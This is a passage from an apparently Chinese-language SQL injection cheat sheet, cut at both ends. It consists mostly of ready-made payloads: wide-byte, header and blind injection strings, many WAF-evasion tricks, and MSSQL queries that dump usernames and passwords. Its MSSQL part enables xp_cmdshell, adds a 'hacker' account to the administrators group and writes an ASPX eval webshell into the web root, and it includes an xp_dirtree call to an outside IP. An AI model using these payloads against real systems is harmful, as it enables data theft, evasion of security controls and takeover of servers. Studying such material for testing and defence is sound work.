title="中转注入"></a>中转注入</h3><p>比如受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。</p><p>因为，注入点经过复杂编码之后，就不能直接结合sqlmap进行漏洞攻击了。或者sqlmap自己编写tamper脚本进行攻击</p><h3 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h3><p>注入payload：</p><p>%’ and ‘%1%’&#x3D;’%1</p><p>%’ and ‘%1%’&#x3D;’%2</p><p>Sql数据库语句：select * from sqltest where names like ‘%要查询的关键字%’</p><p>a%’ and 1&#x3D;1– 正常</p><p>a%’ and 1&#x3D;2– 错误</p><p>有搜索数据的框可以试试加个%总能大力出奇迹</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>前提</p><p>1.使用了addslashes()函数</p><p>2.数据库设置了编码模式为GBK</p><p>原理：前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞</p><p>?id&#x3D;%df’ and 1&#x3D;1 –+</p><p>?id&#x3D;%df’ and 1&#x3D;2 –+</p><p>?id&#x3D;-1%df’ union select 1,2,3 %23</p><h3 id="Cookie注入和Xff注入"><a href="#Cookie注入和Xff注入" class="headerlink" title="Cookie注入和Xff注入"></a>Cookie注入和Xff注入</h3><p>主要是看看程序员有没有在cookie中做了一些过滤，我们有没有可趁之机。</p><p>Cookie: ‘ order by 4–+</p><p>X-Forwarded-For注入</p><p>代表客户端真实的IP，通过修改X-Forwarded-for的值可以伪造客户端IP</p><p>尝试抓包添加插入X-Forwarded-For:127.0.0.1头进行sql注入</p><h3 id="Between注入"><a href="#Between注入" class="headerlink" title="Between注入"></a>Between注入</h3><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p><p>mysql语句： select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘b’;</p><p>select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘t’;</p><p>借鉴大佬图片：</p><p><img src="https://image.3001.net/images/20220714/1657765568_62cf7ec07edc75bbb2cd0.png!small" alt="image"></p><h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h3><p>mysql语句： select * from limit test limit 1,[可控点] or select … limit [可控点]</p><p>limit后面能够拼接的函数只有into和procedure，into可以用来写文件，本文我们不考虑。在Limit后面 可以用 procedure analyse()这个子查询，而且只能用extractvalue 和 benchmark 函数进行延时</p><p><em><strong>procedure analyse(updatexml(rand(),concat(0x3a,benchmark(10000000,sha1(1)))),1)</strong></em></p><p>select id from users;</p><p>select id from users limit 0,1 union select username from users;</p><p><img src="https://image.3001.net/images/20220714/1657765587_62cf7ed363bca35f96495.png!small" alt="image"></p><p>select field from user where id &gt;0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</p><p>基于时间盲注：</p><p>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p><h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h3><p>select * from 表名 order by 列名(或者数字) asc；升序(默认升序)</p><p>select * from 表名 order by 列名(或者数字) desc；降序</p><p>当页面出现mysql报错信息时，注入点在 order by后面，此时可以利用报错信息进行注入，尝试报错注入</p><p><img src="https://image.3001.net/images/20220714/1657765602_62cf7ee2335a18b91bc38.png!small" alt="image"></p><p>?sort&#x3D;1 and(select extractvalue(0x7e,concat(0x7e,database(),0x7e)))</p><p>?sort&#x3D;(select 1 from(select 1 and if(ascii(substr((user()),1,1))&#x3D;114,sleep(5),1))x)</p><h2 id="Sql注入绕过姿势"><a href="#Sql注入绕过姿势" class="headerlink" title="Sql注入绕过姿势"></a>Sql注入绕过姿势</h2><h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p><p>payload:</p><p>%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F; &#x2F;<em>!</em>&#x2F;</p><p>最基本的绕过方法，用注释替换空格： &#x2F;* 注释 *&#x2F;</p><p><img src="https://image.3001.net/images/20220714/1657765618_62cf7ef2f3244c1249103.png!small" alt="image"></p><p>括号绕过空格</p><p>mysql语句：select(user())from dual where(1&#x3D;1)and(2&#x3D;2)</p><p>这种过滤方法常常用于time based盲注,例如：</p><p>?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</p><h3 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h3><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p><p>select column_name from information_schema.tables where table_name&#x3D;0x7573657273</p><h3 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><p>select substr(database() from 1 for 1);</p><p>select mid(database() from 1 for 1);</p><p>使用join：</p><p>union select 1,2#</p><p>等价于 union select * from (select 1)a join (select 2)b</p><p>使用like:</p><p>select ascii(mid(user(),1,1))&#x3D;80 #</p><p>等价于 select user() like ‘r%’</p><p>对于limit可以使用offset来绕过：</p><p>select * from news limit 0,1 #</p><p>等价于下面这条SQL语句 select * from news limit 1 offset 0</p><h3 id="绕过比较符号"><a href="#绕过比较符号" class="headerlink" title="绕过比较符号()"></a>绕过比较符号()</h3><p>（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</p><p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句：</p><p>select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</p><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句:</p><p>select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</p><h3 id="Between注入-1"><a href="#Between注入-1" class="headerlink" title="Between注入"></a>Between注入</h3><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p><p><img src="https://image.3001.net/images/20220714/1657765644_62cf7f0c4a9bf9f4e426d.png!small" alt="image"><br>使用between and：</p><p>使用between and:</p><p>between a and b：</p><p>between 1 and 1; 等价于 &#x3D;1</p><h3 id="or-and-xor-not绕过："><a href="#or-and-xor-not绕过：" class="headerlink" title="or and xor not绕过："></a>or and xor not绕过：</h3><p>and&#x3D;&amp;&amp; or&#x3D;|| xor&#x3D;| not&#x3D;!</p><h3 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a>绕过注释符</h3><p>（#，–(后面跟一个空格））过滤：</p><p>id&#x3D;1’ union select 1,2,3||’1</p><p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p><p>id&#x3D;1’ union select 1,2,’3</p><h3 id="绕过等于号"><a href="#绕过等于号" class="headerlink" title="绕过等于号"></a>绕过等于号</h3><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h3 id="绕过union，select，where等："><a href="#绕过union，select，where等：" class="headerlink" title="绕过union，select，where等："></a>绕过union，select，where等：</h3><p>（1）使用注释符绕过：</p><p>常用注释符：&#x2F;&#x2F;，– , &#x2F;**&#x2F;, #, –+, – -, ;,%00,–a</p><p>用法：U&#x2F;<strong>&#x2F; NION &#x2F;</strong>&#x2F; SE&#x2F;<strong>&#x2F; LECT &#x2F;</strong>&#x2F;user，pwd from user</p><p>（2）使用大小写绕过：</p><p>id&#x3D;-1’UnIoN&#x2F;**&#x2F;SeLeCT</p><p>（3）内联注释绕过：</p><p>id&#x3D;-1’&#x2F;<em>!UnIoN</em>&#x2F; SeLeCT 1,2,concat(&#x2F;<em>!table_name</em>&#x2F;) FrOM &#x2F;<em>information_schema</em>&#x2F;.tables &#x2F;<em>!WHERE *&#x2F;&#x2F;*!TaBlE_ScHeMa</em>&#x2F; like database()#</p><p>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</p><p>id&#x3D;-1’UNIunionONSeLselectECT1,2,3–-</p><h2 id="Sql注入Bypass"><a href="#Sql注入Bypass" class="headerlink" title="Sql注入Bypass"></a>Sql注入Bypass</h2><h3 id="WAF绕过-应用层"><a href="#WAF绕过-应用层" class="headerlink" title="WAF绕过-应用层"></a>WAF绕过-应用层</h3><p>Sql绕过姿势：<a href="https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html">https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html</a></p><h4 id="大小写-关键字替换"><a href="#大小写-关键字替换" class="headerlink" title="大小写&#x2F;关键字替换"></a>大小写&#x2F;关键字替换</h4><ul><li>id&#x3D;1UnIoN&#x2F;**&#x2F;SeLeCT1,user()</li><li>Hex() bin() 等价于 ascii()</li><li>Sleep() 等价于 benchmark()</li><li>Mid() substring() 等价于substr()</li><li>@@user 等价于 User()</li><li>@@Version 等价于 version()</li></ul><p>绕过：</p><p>AND -&gt; &amp;&amp;</p><p>OR -&gt; || &#x2F; ^</p><p>&#x3D; -&gt; LIKE,REGEXP, BETWEEN, not &lt; and not &gt;，!&lt;&gt;</p><p>&gt; X -&gt; not between 0 and X</p><p>WHERE -&gt; HAVING</p><p>手工盲注 1’||ascii(substr(database(),2,1))&gt;&#x3D;’120</p><h4 id="各种编码"><a href="#各种编码" class="headerlink" title="各种编码"></a>各种编码</h4><p>大小写，URL，hex，%0A等</p><h4 id="注释使用"><a href="#注释使用" class="headerlink" title="注释使用"></a>注释使用</h4><p>&#x2F;&#x2F;—-+#&#x2F;&#x2F;+:%00&#x2F;!&#x2F;等</p><h4 id="再次循环"><a href="#再次循环" class="headerlink" title="再次循环"></a>再次循环</h4><p>union&#x3D;&#x3D;uunionnion</p><h4 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h4><p>比如在burp抓包时，存在Post请求的注入，如id&#x3D;1’ and 1&#x3D;2#</p><p>尝试分块传输</p><p><img src="https://image.3001.net/images/20220714/1657765719_62cf7f578b907ecc13fdc.png!small" alt="image"><br>进行分块传输的时候，请求头要加上<strong>Transfer-Encoding: Chunked</strong>，然后POST的数据规则如下</p><p>2 #下面的数据的长度，可以在后面加个分号然后添加注释（2; hello world） id #请求的参数 2 #下面的数据的长度 &#x3D;1 #请求的值，和前面的id连起来 0 #表明分块请求结束，一个0和两个换行</p><h4 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h4><p>hex()、bin() &#x3D;&#x3D;&gt; ascii()<br>sleep() &#x3D;&#x3D;&gt;benchmark()<br>concat_ws()&#x3D;&#x3D;&gt;group_concat()<br>mid()、substr() &#x3D;&#x3D;&gt; substring()<br>@@user &#x3D;&#x3D;&gt; user()<br>@@datadir &#x3D;&#x3D;&gt; datadir()<br>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　<br>或者：<br>substr((select ‘password’),1,1) &#x3D; 0x70<br>strcmp(left(‘password’,1), 0x69) &#x3D; 1<br>strcmp(left(‘password’,1), 0x70) &#x3D; 0<br>strcmp(left(‘password’,1), 0x71) &#x3D; -1</p><h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><p>?id&#x3D;1&amp;id&#x3D;2&amp;id&#x3D;3</p><h4 id="编码解码及加密解密"><a href="#编码解码及加密解密" class="headerlink" title="编码解码及加密解密"></a>编码解码及加密解密</h4><ul><li>s-&gt;%73-&gt;%25%37%33</li><li>hex,unlcode,base64等</li></ul><h4 id="更改请求提交方式"><a href="#更改请求提交方式" class="headerlink" title="更改请求提交方式"></a>更改请求提交方式</h4><p>尝试更改Get请求为Post请求</p><ul><li>GET POST COOKIE等</li><li>POST-&gt;multipart&#x2F;form-data</li></ul><h4 id="中间件HPP-HTTP参数污染"><a href="#中间件HPP-HTTP参数污染" class="headerlink" title="中间件HPP(HTTP参数污染)"></a>中间件HPP(HTTP参数污染)</h4><p><img src="https://image.3001.net/images/20220714/1657765734_62cf7f6657d4c137788e0.png!small" alt="image"></p><p><strong>HPP</strong>是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p><ul><li>原理：浏览器在跟服务器进行交互的过程中，浏览器往往会在GET&#x2F;POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="http://www.baidu.com/?name=aa&name=bb%EF%BC%8C%E9%92%88%E5%AF%B9%E5%90%8C%E6%A0%B7%E5%90%8D%E7%A7%B0%E7%9A%84%E5%8F%82%E6%95%B0%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E4%BC%9A%E4%B8%8D%E4%B8%80%E6%A0%B7%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFname=aa%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%8F%96%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFname=bb%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%A4%E4%B8%AA%E5%8F%82%E6%95%B0%E9%83%BD%E5%8F%96%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFname=aa,bb">http://www.baidu.com?name=aa&amp;name=bb，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是name=aa。有的服务器是取第二个参数，也就是name=bb。有的服务器两个参数都取，也就是name=aa,bb</a> 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</li><li>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同Web服务器对于出现多个参数时的选择</li><li>通过HPP接管账户,当网站开发者不熟悉Web服务器对于多参数时如何选择，将给攻击者可乘之机。HPP能针对客户端和服务端进行攻击。</li><li>HPP参数污染还可以用于绕过某些防火墙对于 SQL注入的检测，例如当Web服务器对多参数都同时选择时，我们可以用以下这种方式绕过某些防火墙：</li></ul><p><a href="http://www.test.com/index.asp?page=select">http://www.test.com/index.asp?page=select</a> 1,2,3 from table where id&#x3D;1<br><a href="http://www.test.com/index.asp?page=select">http://www.test.com/index.asp?page=select</a> 1&amp;page&#x3D;2,3 from table where id&#x3D;1</p><p>HTTP参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果,以参数color&#x3D;red&amp;color&#x3D;blue为例</p><h3 id="WAF绕过-数据库特性"><a href="#WAF绕过-数据库特性" class="headerlink" title="WAF绕过-数据库特性"></a>WAF绕过-数据库特性</h3><p>mysql注释符有三种</p><ul><li>#,&#x2F;…&#x2F;,–…(注意–后面有一个空格，或者为–+)</li></ul><p>空格符</p><ul><li>0x09,0x0a-0x0d,0x20,0xa0</li></ul><p>特殊符号：%a换行符</p><ul><li>可结合注释符使用%23%0a,%2d%2d%0a</li></ul><p>内联注释</p><ul><li>&#x2F;!UnIon12345SelEcT&#x2F;1,user(),数字范围1000-50540</li></ul><p>mysql黑魔法</p><ul><li>select{xusername}from{x11test.admin};</li></ul><h3 id="WAF绕过-逻辑层"><a href="#WAF绕过-逻辑层" class="headerlink" title="WAF绕过-逻辑层"></a>WAF绕过-逻辑层</h3><p>逻辑问题</p><ol><li>云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。</li><li>当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。</li><li>HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。</li><li>特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。比如：id&#x3D;1 %00 and 1&#x3D;2 union select 1,2,column_name from information_schema.columns</li></ol><p>性能问题</p><ul><li>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</li><li>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</li></ul><p>例子1：</p><p>?id&#x3D;1and(select1)&#x3D;(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</p><ul><li>0xA*1000指0xA后面A重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</li></ul><p>例子2：</p><p>?a0&#x3D;0&amp;a1&#x3D;1&amp;…..&amp;a100&#x3D;100&amp;id&#x3D;1<br>union<br>select<br>1,schema_name,3<br>from<br>INFORMATION_SCHEMA.schemata</p><ul><li>获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。</li></ul><p>白名单</p><ul><li>方式一：IP白名单</li><li>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。测试方法：修改http的header来bypasswaf</li></ul><p>X-forwarded-for<br>X-remote-IP<br>X-originating-IP<br>x-remote-addr<br>X-Real-ip</p><p>方式二：静态资源</p><ul><li>特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</li><li>Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php后面基本不识别</li></ul><p><a href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a><br><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p><p>方式三：url白名单</p><ul><li>为了防止误拦，部分waf内置默认的白名单列表，如admin&#x2F;manager&#x2F;system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势</li></ul><h2 id="Sqlserver注入（mssql）"><a href="#Sqlserver注入（mssql）" class="headerlink" title="Sqlserver注入（mssql）"></a>Sqlserver注入（mssql）</h2><p><strong>SQL Server</strong>数据库是由Microsoft开发和推广的关系数据库管理系统(DBMS)，是一个比较大型的数据库。端口号为 <strong>1433</strong>。数据库后缀名 .mdf，注释符是 – 。延时命令：WAITFOR DELAY ‘0:0:2’</p><p><strong>SQLServer有三个权限级别：</strong></p><ul><li>sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</li><li>db权限：文件管理，数据库操作等权限 users-administrators</li><li>public权限：数据库操作 guest-users</li></ul><p><img src="https://image.3001.net/images/20220714/1657765752_62cf7f787d9033b77f774.png!small" alt="image"></p><p>判断是否是SA权限(数据库操作、文件管理、命令执行、注册表读取)</p><ol><li>select is_srvrolemember(‘sysadmin’)</li></ol><p>判断是否是db_owner权限 (数据库操作、文件管理)</p><ol><li>select is_member(‘db_owner’)</li></ol><p>判断是否是public权限 (数据库操作)</p><ol><li>select is_srvrolemember(‘public’)</li></ol><p>SQLServer数据库有6个默认的库，分别是4个系统数据库：master 、model 、msdb 、tempdb，和2个实例数据库：ReportServer、ReportServerTempDB。其中，系统数据库 model 和 tempdb 默认是没有数据表的。</p><p>附上payload：</p><p>select @@version; #查询数据库的版本</p><p>select @@servername; #查询服务名</p><p>select host_name(); #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</p><p>select db_name(); #查询当前数据库名</p><p>select db_name(1); #查询第一个数据库名</p><p>select db_name(2); #查询第二个数据库名</p><p>select user; #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner</p><p>use tempdb #切换到tempdb表</p><p>top n #查询前n条记录</p><p>limit 2,3 #查询第2条开始的3条数据，也就是2,3,4</p><p>select substring(‘string’,2,1) #截取给定字符串的索引为2的1个字符</p><p>select ascii(‘a’) #查询给定字符串的ascii值</p><p>select len(‘string’) #查询给定字符串的长度</p><p>EXEC sp_spaceused @updateusage &#x3D; N’TRUE’; #查询当前数据库的大小</p><p>sp_spaceused ‘表名’ #查询指定表名的大小</p><p>EXEC master.sys.xp_dirtree ‘\192.168.106.5\xx.txt’,0,1;</p><p>判断是否是SA权限</p><p>select is_srvrolemember(‘sysadmin’)</p><p>判断是否是db_owner权限</p><p>select is_member(‘db_owner’)</p><p>判断是否是public权限</p><p>select is_srvrolemember(‘public’)</p><h3 id="普通注入-1"><a href="#普通注入-1" class="headerlink" title="普通注入"></a>普通注入</h3><p>order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4之间。查找回显点</p><p>id&#x3D;2 and 1&#x3D;2 union all select null,null,null,null；挨个替换null 发现 select null,2,null,null 页面出现回显。</p><p>查找所在库名称添加： ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select db_name()), ‘3’, 4</p><p>找到数据库名称。 提示：这里也可以使用db_name(1)、db_name(2)等查询其他数据</p><p>查找数据库表名称：?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype &#x3D; ‘U’),’3’,4提示: xtype&#x3D;’U’ 为 用户表</p><p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 col_name(object_id(‘manage’),1) from sysobjects),’3’,4替换 col_name(object_id(‘manage’),1) 中的1 依次为 2，3，4查出所有列名。</p><p>查取数据: ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 username from manage),’3’,4 获取用户名；</p><p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 password from manage),’3’,4 获取密码</p><h2 id="全回显操作"><a href="#全回显操作" class="headerlink" title="全回显操作"></a>全回显操作</h2><p>获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】</p><p>(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>案例： mozhe_dbv2是数据库名字</p><p><img src="https://image.3001.net/images/20220714/1657765776_62cf7f9087fb6626ca007.png!small" alt="image"></p><p>一次爆指定表的所有列（只限于mssql2005及以上版本）：</p><p>(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–</p><p>(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p><p>案例： mange是表名<br><img src="https://image.3001.net/images/20220714/1657765789_62cf7f9d50b3e1805fb70.png!small" alt="image"></p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>and 1&#x3D;(select @@VERSION) &#x2F;&#x2F;<strong>MSSQL</strong>版本</p><p>And 1&#x3D;(select db_name()) &#x2F;&#x2F;当前数据库名</p><p>and 1&#x3D;(select @@servername) &#x2F;&#x2F;本地服务名</p><p>and 1&#x3D;(select IS_SRVROLEMEMBER(‘sysadmin’)) &#x2F;&#x2F;判断是否是系统管理员sa</p><p>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</p><p>and 1&#x3D;(Select IS_MEMBER(‘db_owner’)) &#x2F;&#x2F;判断是否是库权限dbo</p><p>and 1&#x3D; (Select HAS_DBACCESS(‘master’)) &#x2F;&#x2F;判断是否有库读取权限</p><h3 id="2-单个爆破："><a href="#2-单个爆破：" class="headerlink" title="(2)单个爆破："></a>(2)单个爆破：</h3><p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables ))—获取第一个表名</p><p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables where table_name not in(‘photoGalary’) )) 获取第二个表名</p><p>and 1&#x3D;convert(int,(select top 1 column_name from information_schema.columns where table_name&#x3D;’login’ ))— 获取第一个列名</p><p>and 1&#x3D;convert(int,(select top 1 username from login ))</p><p>and 1&#x3D;convert(int,(select top 1 password from login ))</p><h3 id="2-全爆语句"><a href="#2-全爆语句" class="headerlink" title="(2)全爆语句"></a>(2)全爆语句</h3><p>爆表，要求sqlserver版本2005以上</p><p>and 1&#x3D;(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>爆列</p><p>and 1&#x3D;(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><p>aspx?id&#x3D;1;if (select IS_SRVROLEMEMBER(‘sysadmin’))&#x3D;1 WAITFOR DELAY ‘0:0:5’ –</p><p>如果是sa权限，就延时。</p><p>案例：</p><p><img src="https://image.3001.net/images/20220714/1657766248_62cf8168dbaad26776ceb.png!small" alt="img"></p><p>判断内容</p><p>aspx?id&#x3D;1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY ‘0:0:5’–</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>1.aspx?id&#x3D;1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;&#x3D; 109</p><h3 id="XP-CMDSHELL检测"><a href="#XP-CMDSHELL检测" class="headerlink" title="XP_CMDSHELL检测"></a>XP_CMDSHELL检测</h3><p>看下目标的xp_cmdshell存储过程是否还在,主要是想看它有没有被删掉,你也可以用这种方式来查询其它你想知道的任何存储过程，如果判断还在，页面显示正常，不在的话页面报错。</p><p>and 1&#x3D;(select count(*) from master..sysobjects where xtype &#x3D; ‘x’ and name &#x3D; ‘xp_cmdshell’) –</p><p>开启xpcmdshell一句话。前提 1、支持堆叠 2、扩展存储过程没被删除</p><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p><p>前提：sa权限探测是否存在1433端口。然后检测是否开启CMDSHELL</p><p>用XP_CMDSHELL添加用户hacker：</p><p>exec master..xp_cmdshell “whoami”</p><p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net user hacker 123456 &#x2F;add’</p><p>XP_CMDSHELL把用户hacker加到ADMIN组：</p><p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker &#x2F;add’</p><h2 id="拿shell方法"><a href="#拿shell方法" class="headerlink" title="拿shell方法"></a>拿shell方法</h2><p>前提：</p><p>1具备sa或者dbo权限</p><p>2web目录的绝对路径 （可以利用xp_cmdshell的方式寻找绝对路径，插个眼）</p><h3 id="1-xp-cmdshell拿shell"><a href="#1-xp-cmdshell拿shell" class="headerlink" title="(1)xp_cmdshell拿shell"></a>(1)xp_cmdshell拿shell</h3><p>1.aspx?id&#x3D;1;exec master..xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;”Jscript”%^&gt;^&lt;%eval(Request.Item[“pass”],”unsafe”);%^&gt; &gt; c:\WWW\aufeng.aspx’ ;</p><h3 id="2-差异备份拿shell"><a href="#2-差异备份拿shell" class="headerlink" title="(2)差异备份拿shell"></a>(2)差异备份拿shell</h3><p>大概思路：</p><p>假设：<a href="http://xxxxx/show.aspx?code=1">http://xxxxx/show.aspx?code=1</a></p><p>中的code参数存在注入点 并且获得数据库名字为abc 爆出了物理路径为e:\xampp\htdocs\dvwa\</p><p>(1) 修改数据库设置为恢复模式</p><p><a href="http://xxxxx/show.asp?code=1%27;alter">http://xxxxx/show.asp?code=1&#39;;alter</a> database abc set RECOVERY FULL –</p><p>完全恢复模式是默认的恢复模式。在完全恢复模式下，需要手工的对事务日志进行管理，优点是可以恢复到数据库失败或者指定的时间点上。</p><p>(2) 